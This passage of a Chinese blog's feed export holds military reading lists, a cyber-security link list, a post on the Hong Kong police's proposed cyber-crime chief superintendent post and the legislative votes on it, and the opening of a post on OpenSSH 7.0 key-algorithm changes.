<li><a href="https://riboseyim.github.io/2017/07/14/Medal-HK/" target="_blank" rel="noopener">太公分猪肉—香港特区授勋和嘉奖制度批判</a></li>
</ul>
<h4 id="体能训练"><a href="#体能训练" class="headerlink" title="体能训练"></a>体能训练</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/" target="_blank" rel="noopener">Physical Training | 美军体能训练观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand" target="_blank" rel="noopener">Physical Training | 军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.com/2016/04/26/PHT-Running//">Physical Training | 训练项目：跑步</a></li>
<li><a href="https://riboseyim.com/2019/05/19/PHT-Skipping/">Physical Training | 训练项目：跳绳</a></li>
<li><a href="http://www.jianshu.com/p/6a2fea20b57b" target="_blank" rel="noopener">Physical Training | 跑步路线推荐</a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-RunningApp/">Physical Training | 跑步应用评测</a></li>
</ul>
<h4 id="军事史"><a href="#军事史" class="headerlink" title="军事史"></a>军事史</h4><ul>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-CN/" target="_blank" rel="noopener">中国军事史 | Military History of China</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">美国军事史 | Military History of United States</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/History-TaipingHeavenly/" target="_blank" rel="noopener">太平天国史</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">私人历史文献 | 弗吉尼亚笔记</a></li>
<li><a href="https://riboseyim.github.io/2017/10/22/History-Qing-ZhangJiXing/" target="_blank" rel="noopener">私人历史文献 | 时晴斋主人自叙年谱</a></li>
<li><a href="https://riboseyim.github.io/2017/05/28/History-Caoyun/" target="_blank" rel="noopener">黄仁宇:《明代的漕运》</a></li>
</ul>
<h2 id="推荐书目"><a href="#推荐书目" class="headerlink" title="推荐书目"></a>推荐书目</h2><ul>
<li>《战争论》</li>
<li>《国防论》</li>
<li>《剑桥战争史》：罗马的永久性战争设施,战争费用:内在的生命血液，资本和人力</li>
<li>《驱逐舰舰长》(力荐)：海潮出版社</li>
<li>《我在美军航母上的8年》:士兵教育、官兵关系</li>
<li><a href="https://www.gitbook.com/book/riboseyim/manager/details" target="_blank" rel="noopener">电子书《Manager》 </a></li>
</ul>
<h2 id="影视作品"><a href="#影视作品" class="headerlink" title="影视作品"></a>影视作品</h2><ul>
<li>电影《红潮风暴》：舰长vs副舰长的法律关系</li>
<li>电影《猎杀红色十月号》</li>
<li>电影《派恩少校》：预备军官教育（中小学）</li>
<li>电影《征服怒海》：预备军官教育（海军）</li>
<li>电影《西点揭秘》：预备军官教育（陆军）</li>
</ul>
<h2 id="资料卡"><a href="#资料卡" class="headerlink" title="资料卡"></a>资料卡</h2><blockquote>
<p>在海军航空母舰战斗群中，指挥体制的等级分明。航空母舰战斗群由一名二星少将指挥，6 名资深上校充当他的 “部门长”，包括两艘巡洋舰舰长，核动力航空母舰舰长，舰载航空联队联队长，我的上司、搭乘在航空母舰上的驱逐舰中队司令，以及一艘大型后勤舰的舰长。作为一名小小的中校指挥一艘级别较低的驱逐舰，我只不过需要在办公桌上签字，然后说：“这边没有发生什么重要事情。” 开句玩笑！</p>
<p>我们的任务是同时为巡洋舰舰长和驱逐舰中队司令提供支持。巡洋舰舰长负责指挥防空战，即为整个编队提供防空保护，驱逐舰中队司令负责指挥对抗水面舰艇和潜艇的攻击。由于“巴里”舰具备较强的防空、反舰和反潜能力，我们往往会接受各种各样的任务，以充分发挥我舰的战斗力。我的工作是对各种接踵而来的命令进行主次、先后排序，并作出相应反应。—— 詹姆斯·斯塔夫里迪斯《驱逐舰舰长》</p>
</blockquote>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/jjkYkRuo8DU-_amh4wXPqw" target="_blank" rel="noopener">创造力：军事教育的动力源泉</a></li>
<li><a href="http://www.knowfar.org.cn/html/zhanlue/200909/01/173.htm" target="_blank" rel="noopener">胡旻波:美军军官制度简述</a><br>经过通才教育培养出来的军官，思想较少禁锢，知识广博，理论功底扎实，一方面能过适应知识的迅速更新，缩短任命后军事专业技术的培训和深造时间；另一方面，也容易改换专业或退役到地方谋职。在通才教育的基础上，美军得以对其军官实施逐级培训，达到了训用一致，保证其能够在复杂技术条件下完成各项任务。</li>
<li><a href="https://www.defense.gov/About/Insignias/Enlisted/" target="_blank" rel="noopener">美国国防部：士官军衔说明</a></li>
<li><a href="http://www.knowfar.org.cn/html/zhanlue/200905/29/54.htm" target="_blank" rel="noopener">郭慧志：美国陆军国家训练中心地形分析</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5NzQwNjcyMQ==&amp;mid=2651008257&amp;idx=1&amp;sn=19f2da4c76a80ade85f24fa1100724a1&amp;chksm=bd2dfc6f8a5a75793360b3141f1f4dc6985cd25193aa93303c5e0c184a4009bded0e79ee1adc&amp;mpshare=1&amp;scene=1&amp;srcid=1228aEyvMRhm3mwHh5ZWJn3I#rd" target="_blank" rel="noopener">约克瑭：为什么成吉思汗的子孙打不过英法骑兵</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA3NDMxOTQwNw==&amp;mid=2650046711&amp;idx=2&amp;sn=0e5649ed32d385245bcf064903bd94b2&amp;chksm=8701b3b7b0763aa108c5ca390c9dfa5a6ae63e0edb00470c4c9e15bf9d188ae637e00ba228ca&amp;scene=1&amp;srcid=0922iuup6ijt0O3izXueIROj#rd" target="_blank" rel="noopener">英、法、德国陆军军官制度| 知远战略与防务研究所 </a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA3NDMxOTQwNw==&amp;mid=2650047150&amp;idx=1&amp;sn=cf574dbc9aa94af990b6d776f1b8b688&amp;chksm=8701b1eeb07638f892daf7304491fe323e6971d0c32e809f8222138b03a59c45b20c08c13caf&amp;mpshare=1&amp;scene=1&amp;srcid=0124rUJI5bNLffezxzvE8Qc3#rd" target="_blank" rel="noopener">未来特大城市作战：萨德尔城的经验教训 | 知远战略与防务研究所</a></li>
<li><a href="https://mp.weixin.qq.com/s/sBfaNa5EKW6hbzE1Ls8SBg" target="_blank" rel="noopener">美国陆军大学的建立及启示 | 2016-03-02 知远战略与防务研究所</a></li>
<li><a href="https://mp.weixin.qq.com/s/ogc87zZ5TfaMeo9bXDTDWQ" target="_blank" rel="noopener">尖牙利爪： 美国陆军旅战斗队通用编制与装备 | 2018-05-15 李健 知远战略与防务研究所</a></li>
<li>装甲旅医务连增加行为健康顾问.步兵旅增加1个营、4个连的建制（含1个155mm榴弹炮连），军官人数减少 20% 。</li>
</ul>
]]></content>
      <categories>
        <category>军事战略</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>讲武堂</tag>
        <tag>Commander</tag>
        <tag>Intelligence</tag>
      </tags>
  </entry>
  <entry>
    <title>Cyber-Security:国家队</title>
    <url>/2017/05/12/CyberSecurity-GFW/</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul>
<li><a href="https://javapipe.com/blog/iptables-ddos-protection/">DDoS Protection With IPtables: The Ultimate Guide</a></li>
<li><a href="https://theinitium.com/article/20150904-mainland-greatfirewall/">道高一尺，墙高一丈：互联网封锁是如何升级的(2008-2015)</a></li>
</ul>
<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><ul>
<li><a href="https://cn.nytimes.com/china/20130219/c19hack/">揭秘中国网络战部队 | DAVID E. SANGER, DAVID BARBOZA, NICOLE PERLROTH |2013年2月19日</a></li>
</ul>
<h2 id="Open-Source"><a href="#Open-Source" class="headerlink" title="Open Source"></a>Open Source</h2><ul>
<li><a href="https://www.ipfire.org/">IPFire | A hardened open source Linux distribution that primarily performs as a router and a firewall</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="《The-Cyber-Security-Master》"><a href="#《The-Cyber-Security-Master》" class="headerlink" title="《The Cyber-Security Master》"></a><a href="https://www.gitbook.com/book/riboseyim/cyber-security-manual">《The Cyber-Security Master》</a></h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Cyber-Security: Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/10/29/CyberSecurity-WiFi/">Cyber-Security: 警惕 Wi-Fi 漏洞</a></li>
<li><a href="https://riboseyim.github.io/2017/08/31/CyberSecurity-Headers/">Cyber-Security: Web应用安全：攻击、防护和检测</a></li>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2016/10/06/CyberSecurity-SSH/">Cyber-Security: OpenSSH 并不安全</a></li>
<li><a href="https://riboseyim.github.io/2016/06/12/CyberSecurity-Trojan/">Cyber-Security: Linux/XOR.DDoS 木马样本分析</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">Packet Capturing:关于网络数据包的捕获、过滤和分析</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
<li><a href="http://www.jianshu.com/p/670c4d2bb419">Cyber-Security: 事与愿违的后门程序 | Economist</a></li>
<li><a href="https://riboseyim.github.io/2016/10/07/CyberSecurity/">Cyber-Security: 美国网络安全立法策略</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://patents.google.com/patent/CN109286576A/zh">数据包频度分析的网络代理加密流量特征提取方法</a></li>
<li>一种数据包频度分析的网络代理加密流量特征提取方法：本发明涉及一种基于数据包频度与数据包长度和时间戳之差聚类的机器学习Shadowsocks代理的加密流量特征提取方法，旨在为识别Shadowsocks加密过后的网页流量提供区分度大的流量特征。</li>
<li><a href="https://www.computerweekly.com/news/252466203/Top-VPNs-secretly-owned-by-Chinese-firms">Top VPNs secretly owned by Chinese firms</a><br>Almost a third (30%) of the world’s top virtual private network (VPN) providers are secretly owned by six Chinese companies, according to a study by privacy and security research firm VPNpro.</li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Cyber-Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Cyber-Security:香港警务处网络安全与科技罪案调查科</title>
    <url>/2017/04/09/CyberSecurity-CSTCB/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>网络安全和科技罪案调查科（CSTCB）</li>
<li>总警司<span id="more"></span>
</li>
</ul>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>近日，香港立法会人事编制小组委员会开会讨论于警务处开设一个总警司常额职位，以领导网络安全及科技罪案调查科工作。香港保安局向立法會申請拨款，开设一个常额总警司职位，年薪為一百四十六万港元，附带其他福利开支后则为二百二十八万港元。（注：在获得立法会批准以前，实际上一直由一名高级警司负责管理。其他人员编制则由警队內部调配，不受拨款影响。）</p>
<h2 id="网络安全和科技罪案调查科（CSTCB）"><a href="#网络安全和科技罪案调查科（CSTCB）" class="headerlink" title="网络安全和科技罪案调查科（CSTCB）"></a>网络安全和科技罪案调查科（CSTCB）</h2><p>网络安全和科技罪案调查科（Cyber Security and Technology Crime Bureau，缩写：CSTCB，简称科罪组）隶属于香港警务处刑事及保安处刑事部，主要责任为搜集及分析情报、调查严重科技罪案、作出法律及技术性研究，并且与业内专业人士和海外执法机关联络，防止科技罪案发生；与此同时，24小时监察香港（自愿登记参与）的主要电脑系统的网络数据流量变化，防范针对上述系统的网络攻击等科技罪行，确保网络安全。</p>
<p>2011年，有黑客攻击香港交易所网站，导致逾7间股票及窝轮牛熊证停牌。香港警务处认为除了需要调查案件外，亦需要主动监察以预防网络攻击发生。于2012年成立网络安全中心（英文：Cyber Security Centre，缩写：CSC），早期由一名总督察出任主管，领导3名高级督察及20余名警员。2014年1月15日发表的《2014年度香港行政长官施政报告》宣布，科技罪案组将会于同年12月与网络安全中心合。拨归网络安全及科技罪案调查科以后，组建了网络侦测队、网络情报队、网络安全实验室（Cyber Security Laboratory）及网络安全审定及事故应变队，人员大幅扩充。（首任主管至今为梁德光警司）。</p>
<p>原本隶属于商业罪案调查科的科技罪案组及辖下网络安全中心转入网络安全及科技罪案调查科之后，成为警务处继四大刑侦部门商业罪案调查科（CCB）、有组织及三合会调查科（OCTB，俗称O记）、毒品调查科（NB）及刑事情报科（CIB）的第五个刑侦部门。將由一名总警司带领，并增至一百八十人。</p>
<p>升格后的网络安全和科技罪案调查科，属下设有“科技罪案组”及“网络安全组”两大组别，前者调查集团式及高科技罪案，后者则调查大型网络攻击及重大网络安全事故，另设“高级训练队”，负责科技罪案调查的技术培训和训练。（截止2016年11月1日，该科共有编制238人（军装226个））</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/HK_Policy_%20Criminal_201704.png" alt="香港警务处管理架构"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/HK_Policy_%20CSTCB_201705.png" alt="网络安全与科技罪案调查科内部组织架构"></p>
<h2 id="总警司"><a href="#总警司" class="headerlink" title="总警司"></a>总警司</h2><p>总警司（Chief Superintendent of Police，缩写CSP）俗称“一拖二”，是香港警察职级其中一个宪委级职级，为高级警官的级别；位于高级警司之上，警务处助理处长之下，由警务处处长委任。香港警察职级乃参考自英国警衔／军衔，总警司比照上校职级。</p>
<p>最近几年，为了向立法会申请拨款预算，保安局和警务处各级长官可谓全体动员、契而不舍：</p>
<blockquote>
<p>EC(2016-17)23建議在香港警務處開設1個總警司常額職位(警務人員薪級第55點)，由財務委員會批准當日起生效，以領導網絡安全及科技罪案調查科<br>(出席人員：保安局副局長／保安局首席助理秘書長／香港警務處助理處長(刑事)／香港警務處高級警司(網絡安全及科技罪案調查科)／香港警務處警司(網絡安全及科技罪案調查科))<br>(保安事務委員會曾於2014年6月3日和2016年12月6日討論此項建議)<br>(人事編制小組委員會曾於2015年3月11日和2015年4月29日討論此項建議)<br>(就此項建議政府當局提交予人事編制小組委員會的補充資料文(ESC67/14-15(01)和ESC104/14-15(01)))</p>
</blockquote>
<h2 id="支持意见：犯案日趋复杂-需培专才应对"><a href="#支持意见：犯案日趋复杂-需培专才应对" class="headerlink" title="支持意见：犯案日趋复杂 需培专才应对"></a>支持意见：犯案日趋复杂 需培专才应对</h2><blockquote>
<p>增设总警司不单是希望短时间内处理网络安全工作，而是要长远打击科技罪案，并指近年网络罪案数字倍升，要由具领导才能及视野的人处理。——保安局副局长李家超</p>
<p>若增设常额总警司职位打击网络罪行，有关人员要具备前瞻性，以及可预视罪案发展趋势。他期望加强人手、硬件及软件方面的能力，同时指国际合作在打击罪行方面非常重要。——警务处助理处长钟兆扬。</p>
</blockquote>
<p>刑事部辖下负责侦查犯罪的其他科别各自由一名总警司率领，该科自成立以来一直没有专责的总警司职位，因此其主管人员现在必须向刑事部其他总警司汇报，寻求高层次的指示。一般而言，负责打击网络罪行的海外执法单位主管的职级高于或等同于警务处总警司的职级。这些单位包括国际刑警及G7 高科技犯罪工作小组，英国国家打击犯罪总署辖下国家打击网络犯罪组、澳洲联邦警察辖下高科技犯罪侦查小组及新加坡警务处刑事调查部辖下的打击网上罪行指挥中心。</p>
<h2 id="反对意见：担忧网络警察沦为政治打手"><a href="#反对意见：担忧网络警察沦为政治打手" class="headerlink" title="反对意见：担忧网络警察沦为政治打手"></a>反对意见：担忧网络警察沦为政治打手</h2><p>劉慧卿議員表示，雖然她同意有必要加強警方在打擊科技罪行方面的人手，但立法會議員普 遍擔心網絡安全及科技罪案調查科會監視市民在 互聯網上的活動。此外，劉議員指出，其他司法管 轄區的立法機關有成立專責委員會，以審閱敏感的<br>政府文件，例如有關國家安全的文件。政府當局應 參考海外的做法，為立法會議員制訂特別安排，讓他們檢視與保安有關的敏感資料，例如網絡安全中 心的工作。</p>
<p>李卓人議員表示，雖然他同意應加強網絡 安全及科技罪案調查科人手，針對網絡襲擊及科技 罪行為公眾及商業機構提供保障，但他極之擔心所 增加的人手會被用以監視市民的網絡活動，以達政治目的，尤其是為了方便根據《刑事罪行條例》(第 200章)第161條(有犯罪或不誠實意圖而取用電腦) 提出檢控，遏制言論自由。他要求當局提供資料， 說明有多少人員獲調配收集市民透過互聯網發放 有關社會運動及示威活動的信息。陳偉業議員對此 亦表憂慮。</p>
<p>更有舆论强烈质疑香港政府强化网军实为打击异己、走向专制：</p>
<blockquote>
<p>一、警方網軍快速膨脹：CSTCB於成立兩年間人手由180人大幅增加三成至238人。但有關小組（網絡偵測隊、網絡情報隊）的職責說明從未仔細公開。逐年下降之際，警方紀律人員人數仍然於六年上升5%。<br>二、網上巡邏淪為政治工具：「網上巡邏」是CSTCB其中一項工作。2014年涉將部份警務人員資料上載的督察施恒一案中，警方透過網上巡邏收集證據並提出起訴。近年，我們見到很多網民因網上言論而被拘捕，令人懷疑所謂「網上巡邏」已淪為政治打壓的工具，針對異己。<br>三、警察變黑客，竊取網上資料「無皇管」：現時《截取通訊及監察條例》未能規管政府要求網絡供應商要求交出通訊記錄或者限制警方以黑客軟件竊取市民個人資料。</p>
</blockquote>
<p>上一财政年度EC(2014-15)19付諸表決，該項目被否決。投票結果如下：<br>贊成<br>黃定光議員 吳亮星議員 姚思榮議員 張華峰議員 鄧家彪議員<br>李慧琼議員 何俊賢議員 郭偉强議員 潘兆平議員<br> (9名委員)</p>
<p>反對<br>何俊仁議員 梁耀忠議員 何秀蘭議員 陳偉業議員 范國威議員<br>陳志全議員 張超雄議員 李慧琼議員 何俊賢議員 郭偉强議員<br>潘兆平議員 李卓人議員 劉慧卿議員 梁家傑議員 胡志偉議員<br>莫乃光議員 梁繼昌議員 單仲偕議員<br>(14名委員)</p>
<h2 id="未了残局"><a href="#未了残局" class="headerlink" title="未了残局"></a>未了残局</h2><p>综上所述，关于增加网络安全和科技罪案总警司职位的拨款预算，无论赞成派还是反对派，争议的焦点并不在于香港政府每年增加二百二十八万港元的财政开支，而在于政府加强网警的动机何在，突出反映了香港各派政治力量的严重分歧。</p>
<p>至于当局为什么非要单设一个总警司职位，其实还有一个技术考量：<br>根据香港特区现行《截取通讯及监察条例》，执法单位开展监听监视活动必需获得如下授权：</p>
<p><strong>(a) 截取及第 1 類監察</strong></p>
<blockquote>
<p>任何小組法官。<br>《截取通讯及监察条例》第3部 订明授权等：<br>(1)行政長官須按終審法院首席法官的建議，為本條例的目的委任3名至6名合資格法官為小組法官。小組法官的任期為3年。“合資格法官” (eligible judge)指原訟法庭法官。</p>
</blockquote>
<p><strong>(b) 第 2 類監察</strong></p>
<blockquote>
<p>只有以下職級的人員方可獲指定為授權人員—<br>(i) 就香港海關而言，職級不低於總監督的香港海關人員；<br><strong>(ii) 就香港警務處而言，職級不低於總警司的警務人員；</strong><br>(iii) 就入境事務處而言，職級不低於高級首席入境事務主任的入境事務處人員。<br>(iv) 就廉政公署而言，職級不低於首席調查主任的該公署行動處的人員。</p>
</blockquote>
<p>虽然香港立法会目前仍未就该议案最终表决，但是从实际运作情况以及今年行政长官选举结果分析，最终通过议案也就是这一两个财年之内的事。作为观察者而言，都是一个透视香港舆情动态、理解代议制权力运行模式的极佳案例。</p>
<h3 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h3><ol>
<li>2014年：保安局向立法会申请开设总警司职位，立法会项目编号：EC(2014-15)19</li>
<li>2015年：3月11日～4月29日。立法会人事编制小组委员会投票否决。9票赞成，14票反对。<br>贊成<br>黃定光議員 李慧琼議員<br>吳亮星議員 何俊賢議員<br>姚思榮議員 郭偉强議員<br>張華峰議員 潘兆平議員<br>鄧家彪議員</li>
</ol>
<p>反對<br>何俊仁議員 李卓人議員<br>梁耀忠議員 劉慧卿議員<br>何秀蘭議員 梁家傑議員<br>陳偉業議員 胡志偉議員<br>范國威議員 莫乃光議員<br>陳志全議員 梁繼昌議員<br>張超雄議員 單仲偕議員</p>
<ol>
<li>2016年：6月，保安局再次提交建议</li>
<li>2016年：12月6日，咨询立法会保安事务委员会，大致同意。</li>
<li>2017年：1月4日～2月21日，立法会人事编制小组委员会同意。15票赞成，7票反对。<br>贊成<br><a href="https://zh.wikipedia.org/wiki/黃定光">黃定光議員,Wong Ting-kwong,SBS,JP,1949</a> (进出口功能界别，太太是工联会会长林淑仪。香港中华出入口商会副会长、香港中华总商会会董、东莞同乡总会荣誉会长)<br><a href="https://zh.wikipedia.org/wiki/李慧琼">李慧琼議員,Starry Lee Wai-king,SBS,JP,1974</a> (区议会功能界别，民建联主席，香港科技大学会计系，注册会计师&amp;事务所合伙人，25岁土瓜湾北直选连任至今)<br><a href="https://zh.wikipedia.org/wiki/潘兆平">潘兆平議員Poon Siu-ping,BBS,MH,1957</a> (劳工界功能界别，港九劳工社团联会支持。在2016年及2017年香港政治制度改革方案表决时，潘兆平是除主席外，唯一一个在立法会在座，但没有按钮投票的议员，令他“一炮而红”。)<br><a href="https://zh.wikipedia.org/wiki/郭偉强">郭偉强議員,K,wok Wai-keung,1978</a> (香港岛选区，工联会会员)<br><a href="https://zh.wikipedia.org/wiki/姚思榮">姚思榮議員,1952</a>（旅游届功能界别，香港中国旅行社副董事长，香港旅游业议会副主席，2012当选、提名梁振英）<br><a href="https://zh.wikipedia.org/wiki/馬逢國">马逢国议员,Ma Fung-kwok,SBS,JP,1955</a> (体育演艺文化出版界别，银都机构负责人，丑闻：2013年演艺人协会联同10大下属协会要求马逢国立即辞职。)<br><a href="https://zh.wikipedia.org/wiki/廖長江">廖长江议员,Martin Liao Cheung-kong,SBS,JP,1957</a>(商界界别，香港赛马会董事，执业大律师，英国伦敦大学学院，香港新民党荣誉法律顾问)<br><a href="https://zh.wikipedia.org/wiki/盧偉國">卢伟国议员,Lo Wai-kwok,SBS,BBS,MH,JP,1953</a>(工程界界别，香港大学机械工程专业，香港工程师学会前会长，新进科技集团有限公司副主席兼董事总经理，1992年当选香港十大杰出青年)<br><a href="https://zh.wikipedia.org/wiki/鍾國斌">锺国斌,Chung Kwok-pan,1963</a>（纺织及制衣界功能界别，英国罗伯特戈登大学理学士，苏格兰斯特林大学MBA,香港制衣同业协进会会长，自由党党魁，锺伟明织造厂董事）<br><a href="https://zh.wikipedia.org/wiki/何啟明_(工聯會">何启明议员,1985</a> ）(劳工界功能界别，观塘区议会议员，香港工会联合会成员)<br><a href="https://zh.wikipedia.org/wiki/周浩鼎">周浩鼎议员,Holden Chow Ho-ding,1979</a> (区议会功能界别，民建联副主席，执业律师，英国伦敦政经&amp;香港大学，丑闻：浩鼎门事件)<br><a href="https://zh.wikipedia.org/wiki/邵家輝">邵家辉议员，Shiu Ka-fai，1970</a>（批发及零售界界别、自由党副主席及东区宝马山选区民选区议员，已放弃新西兰国籍）<br><a href="https://zh.wikipedia.org/wiki/柯創盛">柯创盛议员,Wilson Or Chong-shing,1973</a> (观塘区，职业议员，丑闻：学历造假门)<br><a href="https://zh.wikipedia.org/wiki/陳振英">陈振英议员,Chan Chun-ying,1961</a> (金融界功能界别，长期在中资银行任职，获得汇丰、渣打、花旗、中银以及东亚等银行支持)<br><a href="https://zh.wikipedia.org/wiki/劉國勳">刘国勋议员,Lau Kwok-fan,1981</a> (区议会功能界别，民建联，香港中文大学，夫人：民建联元老吕学能的女儿吕迪明)</li>
</ol>
<p>反對<br><a href="https://zh.wikipedia.org/wiki/梁國雄">梁国雄议员,Leung Kwok-hung,1956</a> (新界东选区，绰号“长毛”Longhair，托洛茨基主义，传统左翼激进反对派）<br><a href="https://zh.wikipedia.org/wiki/陳志全">陳志全議員,Raymond Chan Chi-chuen,1972</a> (新界东选区，泛民主派，人民力量主席。电台及电视节目主持人)<br><a href="https://zh.wikipedia.org/wiki/張超雄">張超雄議員,Fernando Cheung Chiu-hung,1957</a> (新界东选区，香港理工大学应用社会科学系讲师，工党副主席。1980年毕业于香港浸会学院社会工作系，毕业后任职社会福利机构)<br><a href="https://zh.wikipedia.org/wiki/朱凱廸">朱凯迪议员,Eddie Chu Hoi-dic,1977</a> (新界西选区，香港中文大学中文系，环保主义、反高铁，支持梁国雄出选特首)<br><a href="https://zh.wikipedia.org/wiki/林卓廷">林卓廷议员,Lam Cheuk-ting,1977</a>(新界东选区，香港中文大学政治与行政学系，曾任廉政公署调查主任、民主党总干事)<br><a href="https://zh.wikipedia.org/wiki/羅冠聰">罗冠聪议员,Nathan Law Kwun-chung,1993</a>(香港岛选区，五十八届学联秘书长，23岁当选议员，居于东涌的公共屋邨，电子竞技评论员，岭南大学文化研究系)<br><a href="https://zh.wikipedia.org/wiki/姚松炎">姚松炎议员,Edward Yiu Chung-yim,1964</a>(建筑测量界别，皇家特许测量师学会资深会员，香港大学)</p>
<ol>
<li>2017年：5月12日，立法会财务委员会，未完成审议，延期审议。</li>
</ol>
<h2 id="扩展阅读：《The-Cyber-Security-Master》"><a href="#扩展阅读：《The-Cyber-Security-Master》" class="headerlink" title="扩展阅读：《The Cyber-Security Master》"></a>扩展阅读：<a href="https://www.gitbook.com/book/riboseyim/cyber-security-manual">《The Cyber-Security Master》</a></h2><ul>
<li><a href="https://riboseyim.github.io/2017/05/09/CyberSecurity-Hacker/">Cyber-Security: 黑客与技术、产业及其精神世界</a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Cyber-Security: Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/10/29/CyberSecurity-WiFi/">Cyber-Security: 警惕 Wi-Fi 漏洞</a></li>
<li><a href="https://riboseyim.github.io/2017/08/31/CyberSecurity-Headers/">Cyber-Security: Web应用安全：攻击、防护和检测</a></li>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2016/10/06/CyberSecurity-SSH/">Cyber-Security: OpenSSH 并不安全</a></li>
<li><a href="https://riboseyim.github.io/2016/06/12/CyberSecurity-Trojan/">Cyber-Security: Linux/XOR.DDoS 木马样本分析</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">Packet Capturing:关于网络数据包的捕获、过滤和分析</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
<li><a href="http://www.jianshu.com/p/670c4d2bb419">Cyber-Security: 事与愿违的后门程序 | Economist</a></li>
<li><a href="https://riboseyim.github.io/2016/10/07/CyberSecurity/">Cyber-Security: 美国网络安全立法策略</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://m.cn.apdnews.com/china/hongkong/584454.html">文汇报：香港保安局申设总警司</a></li>
<li><a href="http://www.legco.gov.hk/yr16-17/chinese/fc/esc/agenda/esc20170104.htm">香港特区立法会人事编制小组委员会议事日程</a></li>
<li><a href="http://www.legco.gov.hk/yr16-17/chinese/fc/fc/general/meetings.htm">香港特区立法会财务委员会会议纪要&amp;投票结果</a></li>
<li><a href="http://www.legco.gov.hk/yr16-17/chinese/fc/esc/agenda/esc20170104.htm">香港特区立法会财务委员会人事小组委员讨论文件EC(2016-17)23 ,20170114</a></li>
<li><a href="http://www.legco.gov.hk/yr14-15/chinese/fc/esc/minutes/esc20150429.pdf">香港特区立法会财务委员会人事小组委员讨论文件ECS82/14-15 ,20150429</a></li>
<li><a href="https://www.elegislation.gov.hk/hk/cap589!zh-Hant-HK@2016-06-24T00:00:00?xpid=ID\_1438403494052\_001">《截取通訊及監察條例》</a></li>
<li><a href="http://www.sb.gov.hk/chi/special/sciocs/2016/ICSO%20CoP%20-%20June%202016%20(C">《截取通訊及監察條例》 實務守則</a>.pdf)</li>
<li><a href="https://zh.wikipedia.org/wiki/劉慧卿">维基百科，刘慧卿</a></li>
<li><a href="http://www.legco.gov.hk/yr16-17/chinese/fc/esc/papers/e16-23c.pdf">香港特区立法会财务委员会人事小组委员讨论文件EC（2016-2017）/23，20170104</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Manager</tag>
        <tag>Cyber-Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Cyber-Security:OpenSSH并不绝对安全</title>
    <url>/2016/10/06/CyberSecurity-SSH/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>OpenSSH7.0做出了一些变更，默认禁用了一些较低版本的密钥算法。受此影响，在同一系统中的主机、网络设备必须同步升级，或者开启兼容选项。 实测中，也有某些厂家产品内核的原因，甚至无法升级。由此案例，关于系统版本管理、安全、架构、开源文档，甚至采购方面，都可以引发很多思考。</p>
<span id="more"></span>
